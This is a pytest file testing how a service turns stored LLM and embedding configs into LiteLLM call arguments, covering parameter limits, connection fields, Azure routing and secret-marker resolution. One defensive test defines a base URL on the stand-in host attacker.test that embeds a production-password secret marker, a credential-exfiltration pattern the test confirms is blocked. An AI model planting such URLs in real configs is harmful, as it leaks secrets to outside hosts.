"""What the converter puts in a run payload's LLM and embedder config, and what of it a
LiteLLM call then receives. `LLMConfigData` itself is covered in
`src/shared/models/tests/test_ai_providers_parameters.py`."""

import pytest
from ai_models.domain.catalog import Catalog
from ai_models.domain.specs import ModelKind
from ai_models.models import EmbeddingConfig, EmbeddingModel, LLMConfig, LLMModel, Provider
from ai_models.repository import CatalogRepository
from ai_models.services.config_validation import ConfigValidationService
from tables.exceptions import ConfigNeedsReviewError, ConfigValidationError
from tables.services.converter_service import ConverterService
from tables.services.llm_clients import get_llm_client
from tables.services.secrets import secret_resolver, secret_service
from tables.services.secrets.exceptions import SecretMarkerNotReferenceableError

from tests.ai_models_tests.factories import (
    make_connection_field,
    make_model,
    make_parameter,
    make_provider,
    make_runtime_catalog,
)

pytestmark = pytest.mark.django_db


@pytest.fixture
def runtime_catalog(monkeypatch):
    repository = CatalogRepository(make_runtime_catalog())
    monkeypatch.setattr(CatalogRepository, "default", classmethod(lambda cls: repository))


def _use_runtime_catalog_with(monkeypatch, provider):
    catalog = make_runtime_catalog()
    providers = {**catalog.providers, provider.name: provider}
    repository = CatalogRepository(Catalog(catalog.litellm_version, catalog.parameters, providers, catalog.models))
    monkeypatch.setattr(CatalogRepository, "default", classmethod(lambda cls: repository))


def _config(org, provider_name, model_name, **fields):
    provider = Provider.objects.get_or_create(name=provider_name)[0]
    model = LLMModel.objects.get_or_create(name=model_name, llm_provider=provider)[0]
    return LLMConfig.objects.create(custom_name=f"{provider_name}-{model_name}", model=model, org=org, **fields)


def test_a_setting_only_the_catalog_names_reaches_litellm(monkeypatch, default_org):
    # A setting a LiteLLM upgrade brings in: no code anywhere names it.
    catalog = Catalog(
        litellm_version="1.108.1",
        parameters={
            "temperature": make_parameter("temperature", minimum=0, maximum=2),
            "speculation_depth": make_parameter("speculation_depth", value_type="integer", control="stepper"),
        },
        providers={"openai": make_provider()},
        models={
            ModelKind.LLM: {
                "openai": {
                    "gpt-next": make_model(name="gpt-next", parameter_names=("speculation_depth", "temperature"))
                }
            }
        },
    )
    repository = CatalogRepository(catalog)
    monkeypatch.setattr(CatalogRepository, "default", classmethod(lambda cls: repository))
    config = _config(default_org, "openai", "gpt-next", parameters={"temperature": 0.3, "speculation_depth": 8})

    data = ConverterService().convert_llm_config_data(config)

    assert data.to_litellm_kwargs(provider="openai", exclude={"timeout"}) == {
        "temperature": 0.3,
        "speculation_depth": 8,
    }


def test_set_settings_are_sent_as_stored(runtime_catalog, default_org):
    config = _config(
        default_org,
        "openai",
        "gpt-4o-mini",
        # gpt-4o-mini does not take seed, but a "not set" one is never sent, so never refused.
        parameters={"temperature": 0.3, "max_tokens": 1000, "seed": None},
    )

    data = ConverterService().convert_llm_config_data(config)

    assert data.parameters == {"temperature": 0.3, "max_tokens": 1000}


@pytest.mark.parametrize(
    ("provider_name", "model_name", "parameters", "setting"),
    [
        # The catalog caps Anthropic's temperature at 1.
        ("anthropic", "claude-sonnet", {"temperature": 1.5, "top_p": 0.9}, "temperature"),
        ("openai", "gpt-4o", {"max_tokens": 499}, "max_tokens"),
        ("openai", "gpt-4o", {"max_tokens": 16385}, "max_tokens"),
        # gpt-4o offers reasoning_effort low and high only.
        ("openai", "gpt-4o", {"reasoning_effort": "medium"}, "reasoning_effort"),
        ("openai", "gpt-4o-mini", {"temperature": 0.3, "top_p": 0.9}, "top_p"),
    ],
    ids=["above-the-model-limit", "below-the-minimum", "above-the-output-limit", "choice-not-offered", "setting-not-taken"],
)
def test_a_setting_the_model_does_not_accept_refuses_the_run(
    runtime_catalog, default_org, provider_name, model_name, parameters, setting
):
    config = _config(default_org, provider_name, model_name, parameters=parameters)

    with pytest.raises(ConfigNeedsReviewError) as refusal:
        ConverterService().convert_llm_config_to_pydantic(config)

    message = str(refusal.value.detail)
    assert refusal.value.status_code == 400
    assert refusal.value.detail.code == "config_needs_review"
    assert message.startswith(f"LLM config '{provider_name}-{model_name}' has settings its model does not accept: ")
    assert [problem.split(":")[0] for problem in refusal.value.problems] == [setting]
    assert message.endswith("Edit the config in Settings → AI Models and try again.")
    config.refresh_from_db()
    assert config.parameters == parameters


@pytest.mark.parametrize(
    ("provider_name", "model_name", "parameters"),
    [
        ("anthropic", "claude-sonnet", {"temperature": 1, "max_tokens": 4096}),
        ("openai", "gpt-4o", {"max_tokens": 500, "reasoning_effort": "low"}),
        # Deprecated: the config shows "needs review", but its settings still fit.
        ("openai", "gpt-3.5-turbo-0301", {"seed": 7}),
    ],
    ids=["at-the-model-limit", "at-the-minimum", "deprecated-model"],
)
def test_settings_the_model_accepts_are_sent_unchanged(runtime_catalog, default_org, provider_name, model_name, parameters):
    config = _config(default_org, provider_name, model_name, parameters=parameters)

    assert ConverterService().convert_llm_config_to_pydantic(config).config.parameters == parameters


def test_a_custom_model_sends_its_provider_s_common_settings(runtime_catalog, default_org):
    config = _config(default_org, "openai", "my-fine-tune", parameters={"temperature": 0.2, "seed": 7})

    assert ConverterService().convert_llm_config_data(config).parameters == {"temperature": 0.2, "seed": 7}


def test_connection_fields_are_sent_under_their_litellm_names(monkeypatch, default_org):
    _use_runtime_catalog_with(
        monkeypatch,
        make_provider(
            name="bedrock",
            custom_models=False,
            connection_fields=(
                make_connection_field("aws_access_key_id", secret=True),
                make_connection_field("region", litellm_argument="aws_region_name"),
            ),
        ),
    )
    config = _config(
        default_org,
        "bedrock",
        "anthropic.claude-v2",
        connection={"aws_access_key_id": "epicstaff_secret(aws-key)", "region": "eu-west-1"},
    )

    data = ConverterService().convert_llm_config_data(config)

    assert data.connection == {"aws_access_key_id": "epicstaff_secret(aws-key)", "aws_region_name": "eu-west-1"}


@pytest.mark.parametrize(
    ("provider_name", "model_name"),
    [("openai", "gpt-4o"), ("mystery", "mystery-1")],
    ids=["field-the-provider-does-not-declare", "provider-left-the-catalog"],
)
def test_undeclared_connection_keys_keep_only_what_was_sent_before(
    runtime_catalog, default_org, provider_name, model_name
):
    config = _config(
        default_org,
        provider_name,
        model_name,
        connection={
            "api_version": "2024-06-01",
            "deployment_id": "prod",
            "aws_region_name": "eu-west-1",
            "base_url": "https://gateway.example",
        },
    )

    data = ConverterService().convert_llm_config_data(config)

    assert data.connection == {
        "api_base": "https://gateway.example",
        "api_version": "2024-06-01",
        "deployment_id": "prod",
    }


def test_an_empty_connection_value_is_not_sent(runtime_catalog, default_org):
    config = _config(default_org, "openai", "gpt-4o", connection={"base_url": ""})

    assert ConverterService().convert_llm_config_data(config).connection == {}


def test_the_main_secret_argument_comes_from_the_catalog(monkeypatch, default_org):
    _use_runtime_catalog_with(monkeypatch, make_provider(main_secret_argument="custom_key"))

    custom = ConverterService().convert_llm_config_data(_config(default_org, "openai", "gpt-4o"))
    default = ConverterService().convert_llm_config_data(_config(default_org, "anthropic", "claude-sonnet"))

    assert (custom.main_secret_argument, default.main_secret_argument) == ("custom_key", "api_key")


def test_a_model_without_provider_converts_with_nothing_to_send(runtime_catalog, default_org):
    orphan = LLMModel.objects.create(name="orphan", llm_provider=None)
    config = LLMConfig.objects.create(
        custom_name="orphan", model=orphan, org=default_org, parameters={"temperature": 0.3}
    )

    data = ConverterService().convert_llm_config_data(config)

    assert (data.model, data.parameters, data.connection) == ("orphan", {}, {})


def test_the_session_payload_carries_settings_and_connection_but_no_secret_id(runtime_catalog, default_org):
    config = _config(
        default_org,
        "openai",
        "gpt-4o",
        parameters={"reasoning_effort": "low"},
        connection={"base_url": "https://gateway.example"},
    )

    dumped = ConverterService().convert_llm_config_to_pydantic(config).model_dump()["config"]

    assert dumped["parameters"] == {"reasoning_effort": "low"}
    assert dumped["connection"] == {"api_base": "https://gateway.example"}
    assert dumped["main_secret_argument"] == "api_key"
    assert "api_key_secret_id" not in dumped


def _embedding_config(org, parameters):
    provider = Provider.objects.get_or_create(name="openai")[0]
    model = EmbeddingModel.objects.get_or_create(name="text-embedding-3-small", embedding_provider=provider)[0]
    return EmbeddingConfig.objects.create(
        custom_name="embedder",
        model=model,
        org=org,
        parameters=parameters,
        connection={"base_url": "https://embeddings.example"},
    )


def test_an_embedding_config_sends_its_settings_and_connection(runtime_catalog, default_org):
    config = _embedding_config(default_org, {"dimensions": 256})

    embedder = ConverterService().convert_embedding_config_to_pydantic(config).config

    assert embedder.parameters == {"dimensions": 256}
    assert embedder.connection == {"api_base": "https://embeddings.example"}


@pytest.mark.parametrize(
    ("parameters", "setting"),
    [({"dimensions": 3073}, "dimensions"), ({"dimensions": 256, "task_type": "RETRIEVAL_QUERY"}, "task_type")],
    ids=["above-the-maximum", "setting-not-taken"],
)
def test_an_embedding_config_with_a_setting_its_model_does_not_accept_refuses_the_run(
    runtime_catalog, default_org, parameters, setting
):
    config = _embedding_config(default_org, parameters)

    with pytest.raises(ConfigNeedsReviewError) as refusal:
        ConverterService().convert_embedding_config_to_pydantic(config)

    assert str(refusal.value.detail).startswith("Embedding config 'embedder' has settings its model does not accept: ")
    assert [problem.split(":")[0] for problem in refusal.value.problems] == [setting]


def test_an_azure_deployment_routes_the_django_call_to_it(default_org):
    # The committed catalog: Azure declares base_url, api_version and deployment_id.
    config = _config(
        default_org,
        "azure",
        "gpt-4o",
        connection={"base_url": "https://acme.openai.azure.com", "api_version": "2024-06-01", "deployment_id": "prod"},
    )
    config = LLMConfig.objects.select_related("model__llm_provider").get(pk=config.pk)

    kwargs = get_llm_client(config, principal=None)._build_kwargs([], [])

    assert kwargs["model"] == "azure/prod"
    assert {name: kwargs[name] for name in ("api_base", "api_version")} == {
        "api_base": "https://acme.openai.azure.com",
        "api_version": "2024-06-01",
    }
    # The model already names the deployment; litellm sends any call carrying a
    # deployment_id to Azure.
    assert "deployment_id" not in kwargs


def test_a_deployment_stored_on_a_non_azure_config_does_not_route_the_call_to_azure(default_org):
    # The data migration copies a model row's deployment into any provider's config.
    config = _config(default_org, "openai", "gpt-4o", connection={"deployment_id": "leftover"})
    config = LLMConfig.objects.select_related("model__llm_provider").get(pk=config.pk)

    kwargs = get_llm_client(config, principal=None)._build_kwargs([], [])

    assert kwargs["model"] == "gpt-4o"
    assert "deployment_id" not in kwargs


PROD_DB_PASSWORD = "prod-db-password-value"
LEAKING_URL = "https://attacker.test/?k=epicstaff_secret(PROD_DB_PASSWORD)"


def test_a_stored_marker_outside_a_secret_field_reaches_no_payload_and_no_call(default_org):
    # The data migration copies endpoints stored before markers were checked.
    secret_service.create(text=PROD_DB_PASSWORD, org=default_org, name="PROD_DB_PASSWORD")
    llm = _config(
        default_org,
        "openai",
        "gpt-4o",
        connection={"base_url": LEAKING_URL, "deployment_id": "epicstaff_secret(PROD_DB_PASSWORD)"},
    )
    provider = Provider.objects.get_or_create(name="openai")[0]
    embedder = EmbeddingConfig.objects.create(
        custom_name="embedder",
        model=EmbeddingModel.objects.get_or_create(name="text-embedding-3-small", embedding_provider=provider)[0],
        org=default_org,
        connection={"base_url": LEAKING_URL},
    )
    converter = ConverterService()

    for payload in (
        converter.convert_llm_config_data(llm),
        converter.convert_embedding_config_to_pydantic(embedder).config,
    ):
        resolved = secret_resolver.resolve_payload(payload=payload, org_id=default_org.id)
        assert resolved.connection == {}
        assert PROD_DB_PASSWORD not in resolved.model_dump_json()
    kwargs = get_llm_client(llm, principal=None)._build_kwargs([], [])
    assert "api_base" not in kwargs
    assert PROD_DB_PASSWORD not in repr(kwargs)


def test_a_marker_in_a_declared_secret_field_still_resolves(default_org):
    secret_service.create(text="AKIA-acme", org=default_org, name="AWS_ID")
    config = _config(
        default_org,
        "bedrock",
        "anthropic.claude-v2",
        connection={"aws_access_key_id": "epicstaff_secret(AWS_ID)", "base_url": "https://bedrock.example"},
    )

    payload = ConverterService().convert_llm_config_data(config)
    resolved = secret_resolver.resolve_payload(payload=payload, org_id=default_org.id)

    assert resolved.connection == {"aws_access_key_id": "AKIA-acme", "api_base": "https://bedrock.example"}


@pytest.mark.parametrize(
    ("provider", "model"), [("bedrock", "anthropic.claude-v2"), ("sagemaker", "my-endpoint")]
)
def test_aws_iam_credentials_reach_the_litellm_call(default_org, provider, model):
    for name, text in (("AWS_ID", "AKIA-acme"), ("AWS_SECRET", "wJalr-acme"), ("AWS_TOKEN", "FwoG-acme")):
        secret_service.create(text=text, org=default_org, name=name)
    connection = {
        "aws_access_key_id": "epicstaff_secret(AWS_ID)",
        "aws_secret_access_key": "epicstaff_secret(AWS_SECRET)",
        "aws_session_token": "epicstaff_secret(AWS_TOKEN)",
        "aws_region_name": "eu-west-1",
    }
    ConfigValidationService().validate(ModelKind.LLM, provider, model, {}, connection, default_org.id)
    config = _config(default_org, provider, model, connection=connection)

    payload = ConverterService().convert_llm_config_data(config)
    resolved = secret_resolver.resolve_payload(payload=payload, org_id=default_org.id)

    assert resolved.connection_kwargs() == {
        "aws_access_key_id": "AKIA-acme",
        "aws_secret_access_key": "wJalr-acme",
        "aws_session_token": "FwoG-acme",
        "aws_region_name": "eu-west-1",
    }


@pytest.mark.parametrize("field", ["aws_secret_access_key", "aws_session_token"])
def test_an_aws_credential_field_takes_only_a_secret_marker(default_org, field):
    with pytest.raises(ConfigValidationError) as refusal:
        ConfigValidationService().validate(
            ModelKind.LLM, "bedrock", "anthropic.claude-v2", {}, {field: "plain-value"}, default_org.id
        )

    assert list(refusal.value.detail["connection"]) == [field]


class _PinnedPrincipal:
    """A plugin's service account that may reference only the secrets in `own_secret_ids`."""

    def __init__(self, organization, own_secret_ids):
        self.pinned_org_id = organization.pk
        self._own_secret_ids = frozenset(own_secret_ids)

    def may_reference_secrets(self, secret_ids):
        return secret_ids <= self._own_secret_ids


@pytest.mark.parametrize("field", ["connection", "extra_headers"])
def test_a_principal_s_client_refuses_a_marker_naming_a_secret_it_may_not_reference(default_org, field):
    person_secret = secret_service.create(text="AKIA-person", org=default_org, name="AWS_ID")
    stored = (
        {"connection": {"aws_access_key_id": "epicstaff_secret(AWS_ID)"}}
        if field == "connection"
        else {"extra_headers": {"X-Key": "epicstaff_secret(AWS_ID)"}}
    )
    config = _config(default_org, "bedrock", "anthropic.claude-v2", **stored)

    with pytest.raises(SecretMarkerNotReferenceableError):
        get_llm_client(config, principal=_PinnedPrincipal(default_org, own_secret_ids=()))
    # The same principal owning the secret may use it.
    get_llm_client(config, principal=_PinnedPrincipal(default_org, own_secret_ids=(person_secret.pk,)))
